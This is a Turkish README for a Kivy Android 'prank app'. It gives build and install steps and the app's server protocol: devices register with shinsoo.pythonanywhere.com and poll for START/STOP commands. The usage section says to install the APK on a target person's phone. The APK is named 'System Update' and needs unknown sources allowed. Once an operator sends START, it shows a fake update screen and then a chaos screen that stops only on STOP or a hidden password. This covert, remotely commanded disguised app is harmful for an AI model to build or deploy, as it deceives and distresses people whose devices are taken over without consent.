# Shinsoo Prank App 🎭

Kivy tabanlı, `shinsoo.pythonanywhere.com` ile haberleşen şaka uygulaması.

---

## 📁 Dosya Yapısı

```
proje/
├── main.py          # Ana uygulama
├── music.m4a        # Kaos ekranında çalacak müzik (kendin ekle!)
├── buildozer.spec   # Android APK derleme konfigürasyonu
├── requirements.txt # Python bağımlılıkları
└── README.md        # Bu dosya
```

---

## 🖥️ PC'de Test Etme (Windows/Mac/Linux)

### 1. Gereksinimler
```bash
pip install -r requirements.txt
```

### 2. Çalıştır
```bash
python main.py
```

> `music.m4a` dosyasını `main.py` ile aynı klasöre koymayı unutma.

---

## 📱 Android APK Derleme

### Gereksinimler
- **Ubuntu/Debian Linux** (WSL veya sanal makine de olur)
- Python 3.9+
- buildozer

### Kurulum
```bash
# Sistem bağımlılıkları
sudo apt update
sudo apt install -y python3-pip git zip unzip openjdk-17-jdk \
    autoconf libtool pkg-config zlib1g-dev libncurses5-dev \
    libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev

# Buildozer
pip install buildozer cython
```

### APK Derle
```bash
# Proje klasöründe:
buildozer -v android debug
```

İlk derleme ~30 dakika sürebilir (NDK ve SDK indirir).
APK çıktısı: `bin/Sistem Güncelleme-1.0-arm64-v8a-debug.apk`

### APK'yı Telefona Yükle
```bash
# USB ile bağlıysa:
buildozer android deploy run

# Manuel: APK dosyasını telefona at, bilinmeyen kaynaklara izin ver, kur.
```

---

## ⚙️ Sunucu Endpoint'leri

Uygulamanın çalışması için `shinsoo.pythonanywhere.com` üzerinde şu endpoint'lerin aktif olması gerekir:

| Method | URL | Açıklama |
|--------|-----|----------|
| `POST` | `/register` | Cihazı kaydeder, `device_id` döner |
| `GET`  | `/check/<device_id>` | Komut sorgular (`START` / `STOP` / boş) |

### Örnek `/register` isteği
```json
POST /register
{ "device": "Samsung Galaxy S21 (Android)" }
```

### Örnek `/register` yanıtı
```json
{ "device_id": "abc123" }
```

### Örnek `/check/<id>` yanıtı
```json
{ "command": "START" }   // Şakayı başlat
{ "command": "STOP" }    // Uygulamayı kapat
{ "command": "" }        // Bekle
```

---

## 🎮 Kullanım

1. Hedef kişinin telefonuna APK'yı yükle ve çalıştır.
2. Admin panelinden cihazı gör.
3. **START** komutunu gönder → Güncelleme ekranı çıkar, bar dolar, kaos başlar 🔴
4. **STOP** komutunu gönder veya hedef kişi `gokhan` şifresini girer → Uygulama kapanır.

---

## 🔒 Gizli Şifre

Kaos ekranındaki şifre kutusuna **`gokhan`** yazıp ONAYLA'ya basınca uygulama kapanır.
